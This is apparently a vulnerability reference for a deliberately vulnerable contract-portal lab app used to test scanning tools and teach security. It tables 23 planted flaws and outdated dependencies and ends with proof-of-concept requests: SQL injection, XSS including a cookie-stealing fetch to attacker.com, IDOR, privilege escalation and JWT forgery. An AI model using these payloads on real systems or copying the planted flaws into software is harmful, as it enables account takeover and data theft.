# Contract Portal — Vulnerability Reference

> **WARNING:** This application is intentionally vulnerable for VA tool testing and security education only.

---

## Vulnerability Table

| # | Category | Vulnerability | Endpoint / Location | Severity | CWE |
|---|----------|--------------|---------------------|----------|-----|
| 1 | API Security | Weak JWT secret (`secret123`), no expiry | `POST /api/login`, all JWT tokens | **Critical** | CWE-321 |
| 2 | API Security | CORS `allow_origins=["*"]` all methods/headers | All `/api/*` | High | CWE-942 |
| 3 | API Security | Legacy v1 endpoint — zero authentication | `GET /api/v1/users` | **Critical** | CWE-306 |
| 4 | API Security | Debug/health endpoints expose system info + JWT secret | `GET /api/debug`, `GET /api/health` | **Critical** | CWE-215 |
| 5 | API Security | Outdated packages with known CVEs | `backend/requirements.txt` | High | CWE-1395 |
| 6 | Broken Auth | No rate limiting on login | `POST /api/login` | High | CWE-307 |
| 7 | Broken Auth | No account lockout — unlimited brute force | `POST /api/login` | High | CWE-307 |
| 8 | Broken Auth | Password reset token never expires, 8-char predictable, returned in response | `POST /api/forgot-password` | High | CWE-640 |
| 9 | Broken Access | IDOR — GET any contract by ID without ownership check | `GET /api/contracts/{id}` | High | CWE-639 |
| 10 | Broken Access | IDOR — PUT/edit any contract without ownership check | `PUT /api/contracts/{id}` | High | CWE-639 |
| 11 | Broken Access | Admin endpoint with no role authorization | `GET /api/admin/users` | **Critical** | CWE-862 |
| 12 | Broken Access | Mass assignment — `role` field accepted in user update | `PUT /api/users/{id}` | **Critical** | CWE-915 |
| 13 | Injection | DOM-based XSS via `innerHTML` (URL hash, search query, contract description) | `Dashboard.vue`, `ContractDetail.vue` | High | CWE-79 |
| 14 | Injection | Stored XSS — raw HTML stored in comments, rendered via `v-html` | `POST /api/comments`, `ContractDetail.vue` | High | CWE-79 |
| 15 | Injection | SQL Injection — f-string interpolation in search query | `GET /api/search?q=` | **Critical** | CWE-89 |
| 16 | Sensitive Data | Password hash (MD5, no salt) exposed in API responses | `POST /api/login`, `GET /api/me`, `GET /api/admin/users` | High | CWE-256 |
| 17 | Sensitive Data | Sensitive data stored in `localStorage` (token, role, api_key, user_id) | `Login.vue`, `Profile.vue`, router | High | CWE-312 |
| 18 | Sensitive Data | Source maps enabled in production — exposes original source | `vite.config.js` → `*.js.map` | Medium | CWE-540 |
| 19 | Sensitive Data | Hardcoded API key in frontend Vue component | `Dashboard.vue` `HARDCODED_PAYMENT_API_KEY` | High | CWE-798 |
| 20 | Sensitive Data | Full stack trace + query text returned in error responses | `GET /api/search`, `POST /api/login` | Medium | CWE-209 |
| 21 | Business Logic | Negative contract amounts accepted with no validation | `POST /api/contracts`, `PUT /api/contracts/{id}` | Medium | CWE-20 |
| 22 | Business Logic | Approval workflow can be skipped — status set directly to `approved` | `PUT /api/contracts/{id}` body `status=approved` | High | CWE-284 |
| 23 | Business Logic | Clickjacking — no `X-Frame-Options` or CSP frame-ancestors header | All pages | Medium | CWE-1021 |

---

## Dependency CVEs (requirements.txt)

| Package | Version | CVE | Description |
|---------|---------|-----|-------------|
| python-jose | 3.2.0 | CVE-2022-29217 | Algorithm confusion — attacker can forge JWT using RS256 key as HS256 secret |
| PyJWT | 1.7.1 | CVE-2022-29217 | Same algorithm confusion class |
| cryptography | 3.3.2 | CVE-2023-23931 | Memory corruption in Blowfish |
| cryptography | 3.3.2 | CVE-2023-49083 | NULL pointer dereference via PKCS12 |
| python-multipart | 0.0.5 | CVE-2024-24762 | ReDoS via crafted multipart Content-Type |
| requests | 2.25.1 | CVE-2023-32681 | Proxy-Authorization header leak on redirect |
| Pillow | 8.2.0 | CVE-2021-25290 | Heap buffer overflow (RCE) |
| axios (frontend) | 0.21.1 | CVE-2021-3749 | ReDoS via crafted header value |

---

## Quick PoC Reference

### SQL Injection (vuln #15)
```
GET /api/search?q=' UNION SELECT id,username,password,email,role,api_key,reset_token,created_at FROM users--
Authorization: Bearer <any-valid-token>
```

### Stored XSS (vuln #14)
```
POST /api/comments
{"contract_id": 1, "content": "<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>"}
```

### DOM XSS (vuln #13)
```
http://localhost:3000/dashboard#<img src=x onerror=alert(document.cookie)>
```

### IDOR — Read any contract (vuln #9)
```
GET /api/contracts/1   (with john's token — john doesn't own contract 1)
```

### Privilege Escalation via Mass Assignment (vuln #12)
```
PUT /api/users/2
{"role": "admin"}
Authorization: Bearer <john-token>
```

### Legacy Endpoint — No Auth (vuln #3)
```
GET /api/v1/users   (no Authorization header needed)
```

### Brute Force (vuln #6 & #7)
```
POST /api/login
{"username": "admin", "password": "..."}   # unlimited attempts, no lockout
```

### Skip Approval Workflow (vuln #22)
```
PUT /api/contracts/3
{"status": "approved"}
Authorization: Bearer <any-user-token>
```

### Negative Amount (vuln #21)
```
POST /api/contracts
{"title": "Refund Exploit", "amount": -999999}
```

### JWT Forge (vuln #1)
```python
import jwt
payload = {"user_id": 1, "username": "admin", "role": "admin"}
token = jwt.encode(payload, "secret123", algorithm="HS256")
```
